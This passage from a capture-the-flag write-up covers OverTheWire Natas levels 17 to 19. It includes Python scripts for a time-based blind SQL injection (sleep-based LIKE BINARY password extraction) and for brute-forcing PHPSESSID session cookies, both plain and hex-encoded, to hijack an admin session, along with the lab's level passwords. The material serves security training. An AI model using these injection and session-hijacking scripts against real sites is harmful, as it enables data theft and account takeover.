import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas17"  
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"  
url = "http://natas17.natas.labs.overthewire.org/index.php?"  

# declare the username object for later use
req_object = {'username': ''}  
  
# Variables that will contain the possible chars and the final password  
chars_in_pswd = ''  
pswd = ''  
  
# login to natas17 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Saving all the possible chars in a variable for later use  
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  
  
# Loop to check the presence of each char  
for char in chars:  
    payload = {'username': 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(3) #'}  
    req = requests.post(url, auth=authentication, data=payload)  
    if req.elapsed.seconds >= 3:  
        chars_in_pswd = chars_in_pswd + char  
  
# Print the chars that are contained in the final password  
print(chars_in_pswd)  
  
# Execute the brute-force attack  
for count in range(0, 32):  
    for char in chars_in_pswd:  
        brute_force_payload = {'natas18" and password LIKE BINARY "' + pswd + char + '%" and sleep(3) #'}  
        req_object['username'] = brute_force_payload  
        request = requests.post(url, auth=authentication, data=req_object)  
        if request.elapsed.seconds >= 3:  
            pswd += char  
            print(pswd)  
            break  
  
# Print the final password  
print("The password for the next level of natas is: ", pswd)
```

Also this method will take a bit of time, so take a little break and wait, when you will be back you'll be please with natas18 password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
<br/>

---

### Natas 18
Access the website with the link : http://natas18.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas18
password : 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

Continuing with web-forms, in this level we have a login screen where we have to log as admin to receive the password for natas19.

Looking at the source code we can see that there is a variable called `PHPSESSID` and it can assume values up to 640.
Opening the dev tools we see that `PHPSESSID` is a cookie.

We can also understand that when we insert the right credentials, a new session will be created with an ID value between 0 and 640; if the ID correspond to the one of the admin we will be logged as admin and get our password.

Since we know the range of ID values, we can create a script that will try all the values for us and print the next level's credentials:
```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas18"  
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"  
url = "http://natas18.natas.labs.overthewire.org/index.php?"  
  
# Login to natas18 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Brute forcing the ID and retrieve the password  
for i in range(118, 640):  
    print("testing number", i)  
    cookie = {"PHPSESSID": str(i)}  
    req = requests.post(url, auth=authentication, cookies=cookie)  
    if "You are an admin" in req.text:  
        print("the right ID is: ", i)  
        print(req.text)  
        break
        
```

And in a couple of minutes we have the password : 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
<br/>

---

### Natas 19
Access the website with the link : http://natas19.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas19
password : 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

When we log into the level we get a message saying "This page uses mostly the same code as the previous level, but session IDs are no longer sequential..." 
Another difference is the absence of the link to view the source code of the script behind the form.

In order to better understand the situation i have opened the Dev Tools and tried to login with random credentials, what happens is that a cookie called `PHPSESSID` get created and populated with a sequence of numbers and letters.

I have noticed that the sequence seems only composed by certain numbers and letters, to be more specific it looks like something encoded in hexadecimal.
I decoded it with an online tool and got this: 3336322d61646d696e --> 362-admin

This looks really more similar to what we have  just seen in level 18, knowing that the code is mostly the same it means that we have to find again the right number and than append `-admin`, and encode it in hexadecimal; We can than try a brute force attack by sending all those combinations as cookies like we did on last level.

```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas19"  
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"  
url = "http://natas19.natas.labs.overthewire.org/index.php?"  
  
# Login to natas19 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Brute forcing the cookie and retrieve the password  
for i in range(0, 640):  
    print("testing number", i)  
    code = str(str(i) + "-admin")  
    print(code)  
    hexa_encoded = code.encode().hex()  
    print(hexa_encoded)  
    cookie = {"PHPSESSID": str(hexa_encoded)}  
    req = requests.post(url, auth=authentication, cookies=cookie)  
    if "You are an admin" in req.text:  
        print("the right ID is: ", i, "and the right cookie is: ", cookie)  
        print(req.text)  
        break
        
```

This time will take a bit longer as the ID is set to an higher value, but after some patience we get our password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
The right combination was : 281-admin --> 3238312d61646d696e
<br/>

---
To be continued...
